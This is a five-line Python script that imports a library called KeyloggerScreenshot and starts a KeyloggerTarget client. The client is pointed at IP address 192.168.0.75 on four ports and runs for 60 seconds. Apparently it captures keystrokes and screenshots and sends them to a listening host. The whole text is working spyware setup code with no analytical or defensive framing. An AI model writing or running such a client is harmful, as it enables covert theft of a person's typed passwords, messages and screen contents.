import KeyloggerScreenshot as ks 

ip = '192.168.0.75'
key_client = ks.KeyloggerTarget(ip, 1942, ip, 8235, ip, 2946,ip, 4596, duration_in_seconds=60) 
key_client.start()